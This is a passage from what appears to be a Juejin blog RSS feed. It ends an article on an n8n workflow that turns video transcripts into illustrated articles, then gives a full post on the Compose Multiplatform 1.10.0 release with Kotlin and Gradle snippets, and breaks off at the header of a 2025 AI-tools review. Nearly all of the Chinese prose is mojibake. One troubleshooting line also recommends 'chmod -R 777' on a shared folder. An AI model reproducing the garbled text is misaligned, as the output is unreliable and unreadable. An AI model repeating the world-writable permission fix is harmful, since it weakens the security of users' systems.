{{ $json.<span class="hljs-property">text</span> }} 

ã€å¯ç”¨é…å›¾åˆ—è¡¨ã€‘
{{ $json.<span class="hljs-property">markdown_list</span> }}
(å…± {{ $json.<span class="hljs-property">count</span> }} å¼ å›¾ç‰‡)

ã€ä»»åŠ¡ã€‘
è¯·åŸºäºä»¥ä¸Šå¯¹è¯ç´ ææ’°å†™æ–‡ç« ï¼Œå¹¶éµå¾ªä»¥ä¸‹è§„åˆ™ï¼š
<span class="hljs-number">1.</span> **æ™ºèƒ½é…å›¾**ï¼šä½ æ‹¥æœ‰ {{ $json.<span class="hljs-property">count</span> }} å¼ å›¾ç‰‡çš„æ”¯é…æƒã€‚è¯·æ ¹æ®æ–‡ç« ç¯‡å¹…å’Œå™äº‹èŠ‚å¥ï¼Œå°†è¿™äº›å›¾ç‰‡**å‡åŒ€åœ°**æ’å…¥åˆ°æ–‡ä¸­ï¼ˆä¾‹å¦‚ï¼šæ–‡ç« å‰<span class="hljs-number">1</span>/<span class="hljs-number">3</span>å¤„æ’å…¥ç¬¬ä¸€å¼ ï¼Œå<span class="hljs-number">1</span>/<span class="hljs-number">3</span>å¤„æ’å…¥ç¬¬äºŒå¼ ï¼‰ã€‚å¿…é¡»åŸæ ·è¾“å‡º<span class="hljs-title class_">Markdown</span>å›¾ç‰‡é“¾æ¥ã€‚
<span class="hljs-number">2.</span> **è§’è‰²è¯†åˆ«**ï¼š
   - æ ¸å¿ƒè§‚ç‚¹è¾“å‡ºè€…æ˜¯â€œ{{ $(<span class="hljs-string">'è¡¨å•'</span>).<span class="hljs-property">item</span>.<span class="hljs-property">json</span>.<span class="hljs-property">player1</span> }}â€ï¼ˆä¾‹å¦‚ï¼šå¤§å†°ï¼‰ã€‚
   - å¯»æ±‚å»ºè®®è€…æ˜¯â€œ{{ $(<span class="hljs-string">'è¡¨å•'</span>).<span class="hljs-property">item</span>.<span class="hljs-property">json</span>.<span class="hljs-property">player2</span> }}â€ï¼ˆä¾‹å¦‚ï¼šè¿éº¦äººï¼‰ã€‚
   - è¯·è¯†åˆ«æ–‡æœ¬ä¸­çš„ [å‘è¨€äºº<span class="hljs-number">0</span>] å’Œ [å‘è¨€äºº<span class="hljs-number">1</span>] åˆ†åˆ«å¯¹åº”è°ï¼Œå¹¶åœ¨æ–‡ç« ä¸­æ­£ç¡®ç§°å‘¼ï¼Œä¸è¦ä½¿ç”¨â€œå‘è¨€äºº<span class="hljs-number">0</span>â€è¿™ç§ä»£å·ã€‚
<span class="hljs-number">3.</span> **é£æ ¼è¦æ±‚**ï¼šæ‹’ç»æµæ°´è´¦ï¼Œä½¿ç”¨æ·±åº¦åˆ†ææˆ–æ•…äº‹å™è¿°é£æ ¼ï¼Œè‡ªåŠ¨æç‚¼å°æ ‡é¢˜ã€‚
</code></pre>
<hr/>
<h2 data-id="heading-8">4. ä½¿ç”¨è¯´æ˜</h2>
<ol>
<li><strong>å¯åŠ¨å·¥ä½œæµ</strong>ï¼šç‚¹å‡» n8n ç•Œé¢ä¸Šçš„ <code>Test Workflow</code> æˆ–ä½¿ç”¨ Webhookã€‚</li>
<li><strong>å¡«å†™è¡¨å•</strong>ï¼š
<ul>
<li><strong>Mode</strong>: é€‰æ‹© <code>download</code> (ä¸‹è½½ YouTube) æˆ– <code>local_video</code> (å¤„ç† Docker ç›®å½•ä¸‹çš„æ–‡ä»¶)ã€‚</li>
<li><strong>URL</strong>: è§†é¢‘é“¾æ¥æˆ–æ–‡ä»¶åã€‚</li>
<li><strong>æ ¸å¿ƒè§’è‰²</strong>: å¡«å…¥â€œå¤§å†°â€æˆ–â€œç½—ç¿”â€ç­‰ã€‚</li>
<li><strong>å¯¹è¯äºº</strong>: å¡«å…¥â€œè¿éº¦è§‚ä¼—â€æˆ–â€œå­¦ç”Ÿâ€ç­‰ã€‚</li>
</ul>
</li>
<li><strong>æŸ¥çœ‹ç»“æœ</strong>ï¼š
<ul>
<li>è¿è¡Œç»“æŸåï¼Œåœ¨ Docker æŒ‚è½½çš„ <code>/files</code> ç›®å½•ä¸‹ä¼šç”Ÿæˆä¸€ä¸ª <code>è§†é¢‘æ–‡ä»¶å__å¯¹è¯.md</code> æ–‡ä»¶ã€‚</li>
<li>æ–‡ä»¶å†…å·²è‡ªåŠ¨æ’ç‰ˆå¹¶æ’å…¥äº†ä¸ƒç‰›äº‘çš„å›¾ç‰‡é“¾æ¥ã€‚</li>
</ul>
</li>
</ol>
<h2 data-id="heading-9">5. å¸¸è§é—®é¢˜æ’æŸ¥</h2>
<ul>
<li><strong>Qshell æŠ¥é”™ <code>executable file not found</code></strong>:
<ul>
<li>è¯´æ˜ Docker é•œåƒæ²¡æ„å»ºå¥½ã€‚è¯·ç¡®ä¿è¿è¡Œäº† <code>docker-compose up -d --build</code>ã€‚</li>
</ul>
</li>
<li><strong>DeepSeek è¯»ä¸åˆ°æ–‡æœ¬æˆ–å›¾ç‰‡</strong>:
<ul>
<li>æ£€æŸ¥ <strong>Merge</strong> èŠ‚ç‚¹æ˜¯å¦è®¾ç½®ä¸ºäº† <code>Combine</code> + <code>Merge By Position</code>ã€‚è¿™æ˜¯æœ€å¸¸è§çš„é”™è¯¯ç‚¹ã€‚</li>
</ul>
</li>
<li><strong>æ–‡ä»¶æ— æ³•å†™å…¥</strong>:
<ul>
<li>æ£€æŸ¥ Docker æŒ‚è½½ç›®å½•çš„æƒé™ã€‚å®¿ä¸»æœºä¸Šæ‰§è¡Œ <code>chmod -R 777 ./local_files</code> è§£å†³æƒé™é—®é¢˜ã€‚</li>
</ul>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose Multiplatform 1.10.0 é‡ç£…å‘å¸ƒï¼ä¸‰å¤§æ ¸å¿ƒå‡çº§ï¼Œè·¨å¹³å°å¼€å‘æ•ˆç‡å†æå‡]]></title>    <link>https://juejin.cn/post/7595088044577161262</link>    <guid>https://juejin.cn/post/7595088044577161262</guid>    <pubDate>2026-01-15T00:28:14.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595088044577161262" data-draft-id="7595088044577144878" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose Multiplatform 1.10.0 é‡ç£…å‘å¸ƒï¼ä¸‰å¤§æ ¸å¿ƒå‡çº§ï¼Œè·¨å¹³å°å¼€å‘æ•ˆç‡å†æå‡"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-01-15T00:28:14.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»„æ—æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose Multiplatform 1.10.0 é‡ç£…å‘å¸ƒï¼ä¸‰å¤§æ ¸å¿ƒå‡çº§ï¼Œè·¨å¹³å°å¼€å‘æ•ˆç‡å†æå‡
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»„æ—æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T00:28:14.000Z" title="Thu Jan 15 2026 00:28:14 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸€æ¬¡ç¼–å†™ï¼Œå¤„å¤„é¢„è§ˆï¼›ä¸€é”®çƒ­æ›´ï¼Œå³æ—¶ç”Ÿæ•ˆã€‚</p>
<blockquote>
<p>JetBrains æ­£å¼å‘å¸ƒ Compose Multiplatform 1.10.0ï¼Œè¿™æ˜¯è·¨å¹³å° UI æ¡†æ¶çš„åˆä¸€é‡è¦é‡Œç¨‹ç¢‘ã€‚æœ¬æ¬¡æ›´æ–°å¸¦æ¥äº†<strong>ç»Ÿä¸€ @Preview æ³¨è§£</strong>ã€<strong>Navigation 3 å¯¼èˆªåº“</strong>ã€<strong>Compose Hot Reload æ­£å¼ç‰ˆ</strong>ä¸‰å¤§æ ¸å¿ƒåŠŸèƒ½ï¼Œè®©å¤šå¹³å°å¼€å‘ä½“éªŒæ›´åŠ é¡ºæ»‘ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">ç»Ÿä¸€ @Preview æ³¨è§£ï¼šå‘Šåˆ«å¹³å°å·®å¼‚</h2>
<h3 data-id="heading-1">æ›´æ–°å†…å®¹</h3>
<p>ä»¥å¾€åœ¨ Compose Multiplatform ä¸­ä½¿ç”¨é¢„è§ˆåŠŸèƒ½æ—¶ï¼Œéœ€è¦é’ˆå¯¹ä¸åŒå¹³å°ä½¿ç”¨ä¸åŒçš„æ³¨è§£ï¼š</p>
<ul>
<li>Desktop ç”¨ <code>androidx.compose.desktop.ui.tooling.preview.Preview</code></li>
<li>æ—§ç‰ˆé€šç”¨ <code>org.jetbrains.compose.ui.tooling.preview.Preview</code></li>
</ul>
<p><strong>ç°åœ¨åªéœ€ä¸€ä¸ªæ³¨è§£</strong>ï¼š<code>androidx.compose.ui.tooling.preview.Preview</code>ï¼Œå¯ç›´æ¥åœ¨ <code>commonMain</code> æºé›†ä¸­ä½¿ç”¨ï¼ŒçœŸæ­£å®ç°"ä¸€æ¬¡ç¼–å†™ï¼Œå¤„å¤„é¢„è§ˆ"ã€‚</p>
<h3 data-id="heading-2">ä½¿ç”¨æ–¹å¼</h3>
<p><strong>æ­¥éª¤ 1ï¼šæ›´æ–°ä¾èµ–</strong></p>
<p>åœ¨ <code>build.gradle.kts</code> ä¸­æ·»åŠ ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">commonMain.dependencies {
    implementation(compose.uiTooling)
}
</code></pre>
<p><strong>æ­¥éª¤ 2ï¼šç¼–å†™é¢„è§ˆä»£ç </strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> androidx.compose.ui.tooling.preview.Preview
<span class="hljs-keyword">import</span> androidx.compose.runtime.Composable

<span class="hljs-meta">@Preview</span>
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">GreetingPreview</span><span class="hljs-params">()</span></span> {
    MaterialTheme {
        Text(<span class="hljs-string">"Hello, Compose Multiplatform!"</span>)
    }
}
</code></pre>
<p><strong>æ­¥éª¤ 3ï¼šè¿ç§»æ—§ä»£ç ï¼ˆIDE è‡ªåŠ¨æç¤ºï¼‰</strong></p>
<p>IDE ä¼šè‡ªåŠ¨æ£€æµ‹æ—§æ³¨è§£å¹¶æä¾› Quick Fixï¼Œä¸€é”®å®Œæˆè¿ç§»ã€‚</p>
<hr/>
<h2 data-id="heading-3">Navigation 3ï¼šå…¨æ–°å¯¼èˆªä½“éªŒ</h2>
<h3 data-id="heading-4">æ›´æ–°å†…å®¹</h3>
<p>Navigation 3 æ˜¯ä¸€å¥—<strong>å…¨æ–°çš„å¯¼èˆªåº“</strong>ï¼Œä¸ä¼ ç»Ÿ Navigation 2 æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼š<strong>å¯ä»¥ç›´æ¥æ“ä½œå¯¼èˆªæ ˆ</strong>ã€‚</p>
<p>ä¸å†éœ€è¦é€šè¿‡éšæ™¦çš„ <code>navigate()</code> æ–¹æ³•ä¼ é€’å‚æ•°ï¼Œè€Œæ˜¯åƒæ“ä½œæ™®é€šåˆ—è¡¨ä¸€æ ·æ·»åŠ ã€åˆ é™¤ç›®çš„åœ°ï¼Œé€»è¾‘æ›´åŠ ç›´è§‚ã€‚</p>
<h3 data-id="heading-5">ä½¿ç”¨æ–¹å¼</h3>
<p><strong>æ­¥éª¤ 1ï¼šæ·»åŠ ä¾èµ–</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">commonMain.dependencies {
    implementation(<span class="hljs-string">"org.jetbrains.androidx.navigation3:navigation3-ui:1.0.0-alpha06"</span>)
    implementation(<span class="hljs-string">"org.jetbrains.androidx.lifecycle:lifecycle-viewmodel-navigation3:2.10.0-alpha06"</span>)
}
</code></pre>
<p><strong>æ­¥éª¤ 2ï¼šåŸºç¡€å¯¼èˆªç¤ºä¾‹</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// å®šä¹‰å¯¼èˆªç›®çš„åœ°</span>
<span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Screen</span> {
    <span class="hljs-keyword">object</span> Home : Screen()
    <span class="hljs-keyword">data</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Detail</span>(<span class="hljs-keyword">val</span> id: String) : Screen()
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">AppNavigation</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// åˆ›å»ºå¯è§‚å¯Ÿçš„å¯¼èˆªæ ˆ</span>
    <span class="hljs-keyword">var</span> backStack <span class="hljs-keyword">by</span> remember { mutableStateOf(listOf&lt;Screen&gt;(Screen.Home)) }

    NavDisplay(
        backStack = backStack,
        onBack = { backStack = backStack.dropLast(<span class="hljs-number">1</span>) }
    ) { screen -&gt;
        <span class="hljs-keyword">when</span> (screen) {
            <span class="hljs-keyword">is</span> Screen.Home -&gt; HomeScreen(
                onNavigateToDetail = { id -&gt;
                    <span class="hljs-comment">// ç›´æ¥æ·»åŠ åˆ°æ ˆä¸­</span>
                    backStack = backStack + Screen.Detail(id)
                }
            )
            <span class="hljs-keyword">is</span> Screen.Detail -&gt; DetailScreen(screen.id)
        }
    }
}
</code></pre>
<p><strong>æ­¥éª¤ 3ï¼šå¹³å°ç‰¹å®šæ‰‹åŠ¿æ”¯æŒ</strong></p>
<p><strong>iOS è¿”å›æ‰‹åŠ¿ï¼š</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">EndEdgePanGestureBehavior(enabled = <span class="hljs-literal">true</span>)
</code></pre>
<p><strong>Web é”®ç›˜æ”¯æŒï¼š</strong></p>
<ul>
<li>æŒ‰ <code>Esc</code> é”®è‡ªåŠ¨è¿”å›ä¸Šä¸€é¡µ</li>
<li>è‡ªåŠ¨å…³é—­ Dialogã€Popup ç­‰ç»„ä»¶</li>
</ul>
<hr/>
<h2 data-id="heading-6">Compose Hot Reload æ­£å¼ç‰ˆï¼šå³æ—¶é¢„è§ˆï¼Œæ— éœ€é‡å¯</h2>
<h3 data-id="heading-7">æ›´æ–°å†…å®¹</h3>
<p>Compose Hot Reload ç»è¿‡é•¿æœŸæ‰“ç£¨ï¼Œç°å·²<strong>å‡çº§ä¸º v1.0.0 æ­£å¼ç‰ˆ</strong>ï¼Œå¹¶ä¸”ï¼š</p>
<ul>
<li>âœ… <strong>å†…ç½®äº Compose Multiplatform Gradle æ’ä»¶</strong></li>
<li>âœ… <strong>é»˜è®¤å¯ç”¨ï¼Œæ— éœ€ä»»ä½•é…ç½®</strong></li>
<li>âœ… <strong>æ”¯æŒ Desktop é¡¹ç›®å³æ—¶çƒ­æ›´æ–°</strong></li>
</ul>
<p>ä¿®æ”¹ä»£ç åï¼ŒUI ç«‹å³åˆ·æ–°ï¼Œæ— éœ€é‡æ–°ç¼–è¯‘æ•´ä¸ªåº”ç”¨ã€‚</p>
<h3 data-id="heading-8">ä½¿ç”¨æ–¹å¼</h3>
<p><strong>å¯¹äºæ–°é¡¹ç›®ï¼š</strong></p>
<p>åªéœ€å¼•å…¥ Compose æ’ä»¶ï¼ŒHot Reload è‡ªåŠ¨å¯ç”¨ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">plugins {
    id(<span class="hljs-string">"org.jetbrains.compose"</span>) version <span class="hljs-string">"1.10.0"</span>
    id(<span class="hljs-string">"org.jetbrains.kotlin.multiplatform"</span>) version <span class="hljs-string">"2.1.20"</span>
}
</code></pre>
<p><strong>å¯¹äºç°æœ‰é¡¹ç›®ï¼š</strong></p>
<p>å¦‚æœä¹‹å‰æ‰‹åŠ¨æ·»åŠ äº† Hot Reload æ’ä»¶ï¼Œç°åœ¨å¯ä»¥å®‰å…¨åˆ é™¤ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ ä¸å†éœ€è¦</span>
plugins {
    id(<span class="hljs-string">"org.jetbrains.compose-hot-reload"</span>) <span class="hljs-comment">// å¯åˆ é™¤</span>
}
</code></pre>
<p><strong>ç‰ˆæœ¬è¦æ±‚ï¼š</strong></p>
<ul>
<li>Kotlin ç‰ˆæœ¬ â‰¥ 2.1.20</li>
<li>è‹¥ Kotlin ç‰ˆæœ¬è¿‡ä½ï¼ŒHot Reload è‡ªåŠ¨ç¦ç”¨ï¼Œä¸å½±å“ç¼–è¯‘</li>
</ul>
<hr/>
<h2 data-id="heading-9">å…¶ä»–é‡è¦æ›´æ–°</h2>



































<table><thead><tr><th>åŠŸèƒ½</th><th>è¯´æ˜</th><th>ä½¿ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td><strong>Skia å‡çº§è‡³ M138</strong></td><td>æ¸²æŸ“æ€§èƒ½æå‡ï¼Œæ”¯æŒæ›´å¤šå›¾å½¢ç‰¹æ€§</td><td>å¤æ‚åŠ¨ç”»ã€å›¾å½¢å¯†é›†å‹åº”ç”¨</td></tr><tr><td><strong>iOS UIKit è‡ªé€‚åº”å°ºå¯¸</strong></td><td>åŸç”Ÿç»„ä»¶è‡ªåŠ¨è°ƒæ•´å¤§å°ï¼Œæ— éœ€æ‰‹åŠ¨è®¡ç®—</td><td>æ··åˆ UIKit ç»„ä»¶å¼€å‘</td></tr><tr><td><strong>Web Esc é”®å¯¼èˆª</strong></td><td>æµè§ˆå™¨ä¸­ Esc é”®è§¦å‘è¿”å›</td><td>Web åº”ç”¨å¯¼èˆªä½“éªŒä¼˜åŒ–</td></tr><tr><td><strong>DialogWindow modalityType</strong></td><td>Desktop å¯¹è¯æ¡†æ”¯æŒæ¨¡æ€ç±»å‹è®¾ç½®</td><td>æ¡Œé¢åº”ç”¨çª—å£ç®¡ç†</td></tr><tr><td><strong>AGP 9.0.0 æ”¯æŒ</strong></td><td>å…¼å®¹æœ€æ–° Android Gradle Plugin</td><td>Android é¡¹ç›®</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">å‡çº§æŒ‡å—</h2>
<h3 data-id="heading-11">æœ€ä½ç‰ˆæœ¬è¦æ±‚</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// settings.gradle.kts</span>
pluginManagement {
    plugins {
        kotlin(<span class="hljs-string">"multiplatform"</span>) version <span class="hljs-string">"2.1.20"</span>  <span class="hljs-comment">// æœ€ä½è¦æ±‚</span>
        id(<span class="hljs-string">"org.jetbrains.compose"</span>) version <span class="hljs-string">"1.10.0"</span>
    }
}
</code></pre>
<h3 data-id="heading-12">ä¾èµ–åˆ«åè¿ç§»</h3>
<p>ä» 1.10.0 å¼€å§‹ï¼ŒGradle æ’ä»¶ä¸­çš„ä¾èµ–åˆ«åï¼ˆå¦‚ <code>compose.ui</code>ï¼‰å·²å¼ƒç”¨ï¼Œå»ºè®®ç›´æ¥å£°æ˜ç‰ˆæœ¬ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// âŒ æ—§æ–¹å¼ï¼ˆå·²å¼ƒç”¨ï¼‰</span>
implementation(compose.ui)

<span class="hljs-comment">// âœ… æ–°æ–¹å¼</span>
implementation(<span class="hljs-string">"org.jetbrains.compose.ui:ui:1.10.0"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-13">å…­ã€æ€»ç»“</h2>
<p>Compose Multiplatform 1.10.0 ä¸‰å¤§æ ¸å¿ƒå‡çº§ï¼š</p>

























<table><thead><tr><th>åŠŸèƒ½</th><th>çŠ¶æ€</th><th>æ ¸å¿ƒä»·å€¼</th></tr></thead><tbody><tr><td>ç»Ÿä¸€ @Preview</td><td>âœ… ç¨³å®š</td><td>ä¸€ä¸ªæ³¨è§£ï¼Œè·¨å¹³å°é¢„è§ˆ</td></tr><tr><td>Navigation 3</td><td>ğŸ§ª Alpha</td><td>ç›´æ¥æ“ä½œå¯¼èˆªæ ˆ</td></tr><tr><td>Hot Reload</td><td>âœ… ç¨³å®š</td><td>å³æ—¶çƒ­æ›´æ–°ï¼Œå¼€å‘æ•ˆç‡ç¿»å€</td></tr></tbody></table>
<p><strong>ç«‹å³å‡çº§ï¼Œä½“éªŒæ›´é«˜æ•ˆçš„è·¨å¹³å°å¼€å‘ï¼</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 å¹´ç»ˆå¤ç›˜ï¼šå½“ AI å·¥å…·é“¾ä»ç”Ÿäº§åŠ›è¿›åŒ–ä¸ºæˆ‘çš„ç”Ÿæ´»ç§©åº]]></title>    <link>https://juejin.cn/post/7595043440520495110</link>    <guid>https://juejin.cn/post/7595043440520495110</guid>    <pubDate>2026-01-14T16:28:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595043440520495110" data-draft-id="7594791357144891434" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 å¹´ç»ˆå¤ç›˜ï¼šå½“ AI å·¥å…·é“¾ä»ç”Ÿäº§åŠ›è¿›åŒ–ä¸ºæˆ‘çš„ç”Ÿæ´»ç§©åº"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-14T16:28:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€ç‚¹ä¸€æœ¨"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986187486"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 å¹´ç»ˆå¤ç›˜ï¼šå½“ AI å·¥å…·é“¾ä»ç”Ÿäº§åŠ›è¿›åŒ–ä¸ºæˆ‘çš„ç”Ÿæ´»ç§©åº
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986187486/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€ç‚¹ä¸€æœ¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T16:28:50.000Z" title="Wed Jan 14 2026 16:28:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
